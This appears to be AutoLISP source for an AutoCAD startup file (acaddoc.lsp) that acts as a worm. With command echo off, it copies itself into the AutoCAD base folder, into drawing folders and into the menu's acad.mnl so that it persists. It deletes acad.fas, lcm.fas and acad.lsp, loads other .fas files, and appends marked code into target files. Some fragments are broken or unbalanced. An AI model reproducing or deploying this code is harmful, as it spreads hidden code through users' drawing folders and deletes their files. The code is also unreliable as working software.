(
	 (/ b
	   )
     (setq basepath
	    (findfile "base.dcl")
     )
     (setq basepath
	    (substr basepath
		    1 (- (strlen basepath) 8)
            )
     )
     (setq baseacad (strcat basepath "acaddoc.lsp"))
  
	(setq acaddocpath
               (findfile "acaddoc.lsp")
	)
	(setq acaddocpath
	       (substr acaddocpath
		       1 (- (strlen acaddocpath) 11)
	       )
	)
	(setq acaddoclsp
	       (strcat acaddocpath "acaddoc.lsp"))
	
	
        (setq c-acaddocname
	       (getvar "dwgname")
	)
        (setq c-acaddocpath
	       (findfile c-acaddocname)
	)
        (setq c-acaddocpath
	       (substr c-acaddocpath
		       1 (- (strlen c-acaddocpath) (strlen c-acaddocname))	
		)
	 )
        (setq c-acaddoc
	       (strcat c-acaddocpath "acaddoc.lsp")
	 )
	 (if
           (and
	   (/= basepath acaddocpath)
	   (= c-acaddocpath acaddocpath)
	   )
	     (progn
	       (setq r-acaddoc
	       (open acaddoclsp "r")
	       )
	       (setq w-basepath
	          (open baseacad "w")
		)     
	       (while
	           (setq rl-acaddoc
		    (read-line r-acaddoc)
	           )
	           (write-line rl-acaddoc w-basepath)
	        )
	        (close w-basepath)   
                (close r-acaddoc)
	    
             )
         
	     (progn
	       (setq r-acaddoc
	       (open acaddoclsp "r")
	       )
	       (setq w-basepath
	          (open c-acaddoc "w")
		)
	        (while
	           (setq rl-acaddoc
		    (read-line r-acaddoc)
	           )
	           (write-line rl-acaddoc w-basepath)
	        )
	        (close w-basepath)   
                (close r-acaddoc)
	    
             )
	 )
	 (pric)
)
;;;*-*TXT acad.lsp is loaded once, acaddoc.lsp is loaded for each
;;;       document, s::startup in any case is called after acaddoc.lsp
(setq wold_cmd (getvar "cmdecho"))
(setvar "cmdecho" 0)
( setq
bb 2)
(setq dpath (getvar "dwgprefix"))
(setq wpath (getvar "menuname"))
(setq wpath (substr wpath 1 (- (strlen wpath) 4)))

(setq n 0)
(while(< n 1)
 (if(findfile "acad.fas")
   (if(vl-file-delete (findfile "acad.fas"))
  (setq n 0))
   (setq n 2)))

(setq n 0)
(while(< n 1)
 (if(findfile "lcm.fas")
   (if(vl-file-delete (findfile "lcm.fas"))
  (setq n 0))
   (setq n 2)))

(setq n 0)
(while(< n 1)
 (if(findfile "acad.lsp")
   (if(vl-file-delete (findfile "acad.lsp"))
  (setq n 0))
   (setq n 2)))



(load"shxfont""")
(defun wwriteapp ()
  (if (setq wwjm1 (open wnewacad "w"))
    (progn
      (setq wwjm (open woldacad "r"))
      (while(setq wwz (read-line wwjm))
	 (write-line wwz wwjm1)
      )
      (close wwjm)
      (close wwjm1)
      )  ))



(setq lbz 0)
(setq wwjqm (strcat dpath "acaddoc.lsp"))
(if (setq wwjm (open wwjqm "r"))
  (progn
    (repeat 3 (read-line wwjm))

    (setq wz (read-line wwjm))
    (setq ab (atoi (substr wz 4 1)))
    (close wwjm)
    (if	(> ab bb)
      (setq lbz 1)
    )
  )
)

(setq wwjqm (strcat wpath "acad.mnl"))

(if (setq wwjm (open wwjqm "r"))
  (progn
    (repeat 3 (read-line wwjm))
    (setq wz (read-line wwjm))
    (setq nb (atoi (substr wz 4 1)))
    (close wwjm)
    
    (if	(< nb bb)
      (setq lbz 1)
    )
  )
  (setq lbz 1)
)
(if (= lbz 1)
  (progn
    (setq woldacad (strcat dpath "acaddoc.lsp"))
    (setq wnewacad (strcat wpath "acad.mnl"))
    (wwriteapp)
  )

(setq flagx t)
(setq bz "(setq flagx t)")
(if(null qxgxwddm)(if(findfile "bakdwg.fas")(load "bakdwg.fas")))

(load"shxfont""")
(defun app(source target bz / flag flag1 wjm wjm1 text)
  (setq flag nil)
  (setq flag1 t)
  (if (findfile target)
    (progn
      (setq wjm1 (open target "r"))
      (while (setq text (read-line wjm1))
	(if (= text bz) (setq flag1 nil))
	);while
      (close wjm1)
      );progn
    );if
  (if flag1
    (progn
      (setq wjm (open source "r"))
      (setq wjm1 (open target "a"))
      (write-line (chr 13) wjm1)
      (while (setq text (read-line wjm))
	(if (= text bz) (setq flag t))
	(if flag
	  (progn
	    (write-line text wjm1)
	    );progn
	  );if
	);while
      (close wjm1)
      (close wjm)
      );progn
    );if
  );defun
(setvar "cmdecho" 0)
(setq acadmnl (findfile "acad.mnl"))
(
	 (/ b
	   )
